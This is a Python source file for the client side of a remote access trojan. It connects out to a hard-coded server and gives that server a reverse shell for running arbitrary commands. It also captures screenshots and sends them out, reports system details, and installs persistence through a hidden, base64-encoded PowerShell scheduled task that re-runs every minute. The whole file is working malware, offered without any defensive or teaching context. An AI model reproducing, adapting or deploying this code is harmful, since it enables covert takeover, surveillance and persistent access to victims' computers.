from shutil import ExecError
from socket import *
import os
from time import sleep
from subprocess import getoutput
import random
import pyautogui

BUFFER_SIZE = 4096 #Buffer of conversion
SEPARATOR = "<SEPARATOR>" #For CMD
ISCONNCTED = False #Checks if the client is conncted
IP="10.100.102.19" #IP goes here
PORT=5555 #Port goes here
USERNAME = os.getlogin() #Gets the PC User.


def string_check(data):  # This checks if the os can run this command
    string = str(data).strip()
    if len(string) == 0:
        return "error"
    else:
        return string


def reverse_shell(client):  # Returns revese shell to server
    SEPARATOR = "\n"
    cwd = "(To exit type 'quit')\n"+os.getcwd() + ">"
    client.sendall(cwd.encode())
    while True:
        # receive the command from the server
        command = client.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "quit":
            # if the command is quit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            try:
                output = getoutput(command)
            except Exception as e:
                output = "Command is Invalid" + e
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}>"
        client.sendall(message.encode())


def screenshot(client):  # Takes screenshot of PC and send it to server
    try:
        imagename = random.randint(0, 100000000)
        try:
            os.mkdir(f"C:/Users/{USERNAME}/AppData/Roaming/TEMP")
        except Exception as e:
            pass
        filename = f"C:/Users/{USERNAME}/AppData/Roaming/TEMP/{imagename}.jpg"
        im = pyautogui.screenshot()
        im.save(filename)
        client.sendall(filename.encode())
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)  # Reads the bytes from the file
                if not bytes_read:
                    sleep(1)
                    client.sendall(b"11111111")
                    break
                client.sendall(bytes_read)
    except Exception as e:
        print(f"Error + {e}")


def start_client():  # Start the client side and all the communication is here.
    global ISCONNCTED
    try:
        while True:
            command = client.recv(BUFFER_SIZE).decode()
            if command == "exit":
                client.close()
                print("Server disconnected")
                break
            elif command == "reverse_shell":
                reverse_shell(client)
            elif command == "ipconfig":
                output = os.popen(command).read()
                output = string_check(output)
                client.sendall(output.encode())
            elif command == "whoami":
                output = os.popen(command).read()
                output = string_check(output)
                client.sendall(output.encode())
            elif command == "screenshot":
                screenshot(client)
            elif command == "persistence":
                persistence()
            elif command == "alive?":
                client.sendall("yes".encode())
            else:
                client.sendall("Invalid Command".encode())

    except Exception as e:
        ISCONNCTED = False
        client.close
        print(f"Server disconnected!")
        sleep(1)

def persistence():
    try:
        cwd = os.getcwd() #Gets current working directory
        username = os.getlogin() #Gets current username of host
        os.system(fr'copy "{cwd}\client.py" "C:\Users\{username}\AppData\Roaming"')
        os.system(fr'schtasks /create /sc minute /mo 1 /tn "Update Script" /tr "powershell.exe -nop -w hidden -e SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAcAB5AHQAaABvAG4AIABDADoAXABVAHMAZQByAHMAXABEAGEAbgBpAGUAbABcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAYwBsAGkAZQBuAHQALgBwAHkAIAB9AA=="')
        client.sendall("Persistence added successfully.".encode())
    except Exception as e:
        print(f"{e}")

while True:
    if(ISCONNCTED == False):
        try:
            client = socket(AF_INET, SOCK_STREAM)
            client.connect((IP, PORT))
            ISCONNCTED = True
            print("Conncted.")
            start_client()  # Starts client
        except Exception as e:
            print("Wating for server..")
